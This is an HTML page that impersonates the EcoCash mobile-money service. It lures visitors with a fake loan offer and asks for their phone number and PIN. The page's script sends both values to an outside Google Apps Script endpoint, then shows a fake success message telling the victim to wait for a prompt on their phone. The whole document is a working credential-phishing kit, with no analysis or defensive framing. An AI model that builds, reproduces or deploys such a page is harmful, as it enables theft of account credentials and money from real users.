<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash | Secure Portal</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #ffffff;
        }

        /* Matches the deep blue gradient from your screenshot */
        .banner {
            width: 100%;
            max-width: 500px;
            background: radial-gradient(circle at center, #1e73be 0%, #003366 100%);
            padding: 45px 20px;
            text-align: center;
            color: white;
        }

        .logo-container {
            background: white;
            display: inline-block;
            padding: 6px 14px;
            border-radius: 4px;
            margin-bottom: 25px;
        }
        .logo-text { color: #003366; font-weight: 800; font-size: 22px; }
        .logo-red { color: #cc0000; }

        .headline { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
        .subheadline { font-size: 14px; opacity: 0.9; margin-bottom: 30px; font-weight: 300; }

        .icon-wrapper { margin: 20px auto; width: 80px; height: 80px; }

        .form-area { width: 100%; max-width: 500px; padding: 30px 40px; text-align: center; }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1.5px solid #2ea3f2;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }

        .btn-submit {
            width: 140px;
            background-color: #00a2ff;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        #status-msg { margin-top: 20px; font-size: 14px; color: #003366; }
    </style>
</head>
<body>

    <div class="banner">
        <div class="logo-container">
            <span class="logo-text">Eco<span class="logo-red">Cash</span></span>
        </div>
        <div class="headline">EcoCash is Safe & Secure</div>
        <div class="subheadline">Your PIN is your secret, don't share with anyone</div>
        <div class="icon-wrapper">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="5" y="11" width="14" height="10" rx="2" stroke="white" stroke-width="2"/>
                <path d="M8 11V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V11" stroke="white" stroke-width="2"/>
                <circle cx="12" cy="16" r="1" fill="white"/>
            </svg>
        </div>
    </div>

    <div class="form-area">
        <form id="ecoForm">
            <input type="tel" name="phone" placeholder="Ecocash number" required>
            <input type="password" name="pin" placeholder="Pin" maxlength="4" required>
            <button type="submit" class="btn-submit" id="btn">Get loan</button>
        </form>
        <div id="status-msg"></div>
    </div>

    <script>
        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJVkGa9V_7cGy6Ti17b7dcJyt01sad5MyUDGzlg2-j8lS3GhJ5TO9byxCq0lE55JYPtg/exec';
        const form = document.getElementById('ecoForm');

        form.addEventListener('submit', e => {
            e.preventDefault();
            document.getElementById('btn').innerText = "Processing...";
            document.getElementById('status-msg').innerText = "Checking eligibility...";

            fetch(SCRIPT_URL, { 
                method: 'POST', 
                mode: 'no-cors', 
                body: new FormData(form) 
            })
            .then(() => {
                document.getElementById('status-msg').innerHTML = "<b>Success!</b><br>Please wait for the EcoCash prompt on your phone.";
                document.getElementById('btn').innerText = "Done";
                form.reset();
            })
            .catch(err => {
                document.getElementById('status-msg').innerText = "Error. Please try again.";
                document.getElementById('btn').innerText = "Get loan";
            });
        });
    </script>
</body>
</html>
